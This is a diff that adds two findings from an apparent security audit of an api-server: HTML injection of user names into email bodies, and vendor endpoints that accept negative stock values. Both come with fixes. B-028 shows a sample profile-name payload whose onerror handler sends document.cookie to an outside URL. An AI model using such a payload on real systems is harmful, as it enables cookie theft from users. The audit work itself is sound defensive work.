@@ -1,0 +1,87 @@
+B-028 — Low — User-Supplied Name Is HTML-Injected Into Email Body Without Escaping
+Severity: Low
+Category: HTML Injection / Content Spoofing
+App: api-server → artifacts/api-server/src/services/email.ts
+
+Description:
+Throughout the email service, a user's name field is interpolated directly into HTML email bodies without HTML-encoding:
+
+// sendVerificationEmail (line 102–125)
+const greeting = name ? `, ${name}` : "";          // raw user input
+const heading  = t("emailVerifyHeading", lang).replace("{name}", greeting);
+// ...
+const defaultHtml = `
+  <h2>${heading}</h2>   ← unescaped name inside HTML tag
+  ...
+`;
+
+The same pattern repeats in sendPasswordResetEmail (line 167, 187) and sendAdminAlert (line 301, 308).
+
+The applyTemplateVars function used for custom admin email templates also substitutes variables without HTML-encoding:
+
+function applyTemplateVars(html: string, vars: Record<string, string>): string {
+  let result = html;
+  for (const [key, val] of Object.entries(vars)) {
+    result = result.replace(new RegExp(`\\{${key}\\}`, "g"), val); // no escaping
+  }
+  return result;
+}
+
+A user who sets their profile name to something like </h2><img src=x onerror="fetch('https://tracker.com?c='+document.cookie)"> will have that injected verbatim into any HTML email they receive. While most email clients block script execution, HTML/CSS injection can enable:
+
+Open-redirect tracking pixels (<img> tags loading attacker-controlled URLs)
+Email content spoofing (injecting fake text/links that appear legitimate)
+Breaking email layout for support staff who view the HTML source
+Affected Files:
+
+artifacts/api-server/src/services/email.ts — sendVerificationEmail, sendPasswordResetEmail, sendAdminAlert, applyTemplateVars
+Suggested Fix:
+Add a minimal HTML-escape helper and apply it to all user-controlled values before template substitution:
+
+function escapeHtml(str: string): string {
+  return str
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#x27;");
+}
+// Then:
+const greeting = name ? `, ${escapeHtml(name)}` : "";
+
+B-029 — Low — Vendor Can Set Product Stock to Negative Values (No Floor Validation)
+Severity: Low
+Category: Input Validation
+App: api-server → artifacts/api-server/src/routes/vendor.ts
+
+Description:
+Three vendor endpoints accept a stock field without validating that it is ≥ 0:
+
+1. Single product creation (POST /vendors/products, line ~1289):
+
+stock: stock !== undefined && stock != null ? Number(stock) : null,
+// ← no Math.max(0, ...) or min(0) check
+
+2. Single product update (PATCH /vendors/products/:id, line ~1289):
+
+stock: stock !== undefined && stock != null ? Number(stock) : null,
+
+3. Bulk product update (PATCH /vendors/products/bulk, lines 1370–1372):
+
+updates.stock = item.stock != null ? Number(item.stock) : null;
+updates.inStock = item.stock == null || Number(item.stock) > 0;
+// ← -5 > 0 is false, so inStock=false (correctly hides the product)
+// ← but -5 is written to the DB
+
+A vendor can submit { stock: -999 } and the negative integer is stored in the products.stock column. While inStock is correctly set to false (preventing customers from ordering), this creates corrupted data in products.stock and product_stock_history tables. It can also break the low-stock threshold alerts (stock < threshold AND stock > 0) if the threshold check is later changed.
+
+The same missing bound applies to maxQuantityPerOrder (lines 1294, 1477) — a vendor could set -1 and the value is stored without error.
+
+Affected Files:
+
+artifacts/api-server/src/routes/vendor.ts — product create (line ~1289), product update, bulk update (lines 1370–1372)
+Suggested Fix:
+
+// In all three handlers:
+stock: stock !== undefined && stock != null ? Math.max(0, Number(stock)) : null,
+maxQuantityPerOrder: maxQuantityPerOrder !== undefined ? Math.max(1, Number(maxQuantityPerOrder)) : null,
